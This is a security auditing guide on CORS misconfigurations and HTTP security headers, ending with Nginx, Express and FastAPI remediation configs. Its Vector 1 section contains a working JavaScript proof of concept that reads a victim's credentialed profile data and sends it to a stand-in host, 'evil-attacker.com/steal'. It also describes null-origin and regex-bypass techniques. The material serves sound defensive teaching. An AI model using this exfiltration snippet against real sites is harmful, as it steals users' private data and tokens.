# Security Methodology: HTTP Secure Headers & CORS Auditing

## Table of Contents
1. [Same-Origin Policy (SOP) & CORS Fundamentals](#1-same-origin-policy-sop--cors-fundamentals)
2. [CORS Vulnerability Taxonomy & Exploit Scenarios](#2-cors-vulnerability-taxonomy--exploit-scenarios)
3. [HTTP Security Headers: Defensive Deep Dive](#3-http-security-headers-defensive-deep-dive)
4. [Remediation Guidelines & Configuration Snippets](#4-remediation-guidelines--configuration-snippets)

---

## 1. Same-Origin Policy (SOP) & CORS Fundamentals

The **Same-Origin Policy (SOP)** is the foundational security boundary enforced by modern web browsers. It restricts scripts running in one origin from accessing sensitive resources from another origin.

Two URLs share the same origin if and only if their **Scheme**, **Host**, and **Port** are strictly identical:
- `https://bank.com:443/account` and `https://bank.com:443/dashboard` -> **Same Origin**
- `https://bank.com` and `http://bank.com` -> **Different Origin** (Scheme differs)
- `https://bank.com` and `https://api.bank.com` -> **Different Origin** (Host differs)
- `https://bank.com:443` and `https://bank.com:8443` -> **Different Origin** (Port differs)

### What is CORS (Cross-Origin Resource Sharing)?
Specified in **W3C Recommendation & RFC 6454**, CORS allows servers to explicitly declare which foreign origins are permitted to read their HTTP responses. It relies on response headers such as:
- `Access-Control-Allow-Origin` (ACAO)
- `Access-Control-Allow-Credentials` (ACAC)
- `Access-Control-Allow-Methods` (ACAM)
- `Access-Control-Allow-Headers` (ACAH)

---

## 2. CORS Vulnerability Taxonomy & Exploit Scenarios

### Vector 1: Arbitrary Origin Reflection with Credentials (CRITICAL)
- **Root Cause**: Backend code dynamically reads the incoming HTTP `Origin` header from the request and reflects it verbatim into `Access-Control-Allow-Origin`, accompanied by `Access-Control-Allow-Credentials: true`.
- **Why Developers Do It**: To solve cross-domain AJAX issues during frontend development without maintaining a whitelist.
- **Attack Scenario**:
  1. A victim logs into `https://vulnerable-bank.com`.
  2. The victim visits the attacker's website `https://evil-attacker.com`.
  3. The attacker's page executes:
     ```javascript
     const xhr = new XMLHttpRequest();
     xhr.open("GET", "https://vulnerable-bank.com/api/user/profile", true);
     xhr.withCredentials = true; // Send victim's session cookies
     xhr.onload = function() {
         fetch("https://evil-attacker.com/steal?data=" + encodeURIComponent(xhr.responseText));
     };
     xhr.send();
     ```
  4. The browser attaches the victim's session cookies, sends `Origin: https://evil-attacker.com`.
  5. The server reflects the origin and returns `Access-Control-Allow-Credentials: true`.
  6. The browser allows `evil-attacker.com` to read the victim's private profile and sensitive tokens!

### Vector 2: Insecure Trust of "null" Origin (HIGH)
- **Root Cause**: Backend server configures `Access-Control-Allow-Origin: null`.
- **Exploitation**:
  Browsers generate an `Origin: null` in several scenarios:
  - Local `file://` scheme requests.
  - Redirects across schemes.
  - **Sandboxed iframes**: An attacker embeds `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="...">`. Any request initiated from within this sandboxed frame is assigned an `Origin: null` by the browser!
  - `data:` URI schemes.
- **Impact**: Any attacker can read private endpoint responses by launching an exploit from a sandboxed iframe.

### Vector 3: Regular Expression Prefix / Suffix Flaws (HIGH / MEDIUM)
- Developers often attempt to allow subdomains using poorly anchored regular expressions:
  - `preg_match("/example\.com/", $origin)`
    - **Bypass**: `https://example.com.attacker.com` (Attacker controls domain ending with example.com).
  - `preg_match("/^https:\/\/.*example\.com/", $origin)`
    - **Bypass**: `https://attacker-example.com` (Prefix bypass).

---

## 3. HTTP Security Headers: Defensive Deep Dive

### Strict-Transport-Security (HSTS) - RFC 6797
- Enforces encrypted HTTPS connections.
- Mitigates **SSL-Stripping** attacks (e.g. tools like `sslstrip` that downgrade HTTPS to HTTP on public networks).
- Recommended:
  ```http
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ```

### Content-Security-Policy (CSP) - W3C CSP Level 3
- The primary defense-in-depth mechanism against **Cross-Site Scripting (XSS)**.
- Restricts script execution sources, disallows inline scripts (`'unsafe-inline'`), and restricts framing (`frame-ancestors`).
- Recommended:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';
  ```

### X-Frame-Options - RFC 7034
- Prevents **Clickjacking** (UI Redressing) attacks by preventing unauthorized websites from rendering the page inside an `<iframe>`.
- Values: `DENY` (no framing allowed) or `SAMEORIGIN` (only same origin allowed).

### X-Content-Type-Options
- Disables browser MIME-type sniffing:
  ```http
  X-Content-Type-Options: nosniff
  ```
- Prevents browsers from executing user-uploaded files (such as `.jpg` or `.png`) as executable JavaScript or HTML.

### Referrer-Policy
- Protects sensitive tokens, IDs, or queries from leaking in the `Referer` header to external websites.
- Recommended: `strict-origin-when-cross-origin` or `no-referrer`.

### Permissions-Policy
- Restricts access to sensitive device APIs (camera, microphone, geolocation, USB, accelerometer):
  ```http
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  ```

---

## 4. Remediation Guidelines & Configuration Snippets

### Nginx Configuration
```nginx
# Security Headers
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

# CORS Whitelist (Do NOT reflect blindly)
map $http_origin $cors_allowed {
    default 0;
    "https://trusted-partner.com" 1;
    "https://app.example.com" 1;
}

server {
    ...
    if ($cors_allowed) {
        add_header Access-Control-Allow-Origin $http_origin always;
        add_header Access-Control-Allow-Credentials "true" always;
    }
}
```

### Express.js (Node.js) Configuration
```javascript
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');

const app = express();

// 1. Enforce Secure Headers via Helmet
app.use(helmet());

// 2. Strict CORS Whitelist
const whitelist = ['https://trusted-portal.com', 'https://admin.example.com'];
const corsOptions = {
    origin: function (origin, callback) {
        if (!origin || whitelist.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            callback(new Error('Blocked by CORS policy'));
        }
    },
    credentials: true
};
app.use(cors(corsOptions));
```

### Python FastAPI Configuration
```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# Strict Whitelist only
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://dashboard.example.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST"],
    allow_headers=["Authorization", "Content-Type"],
)
```
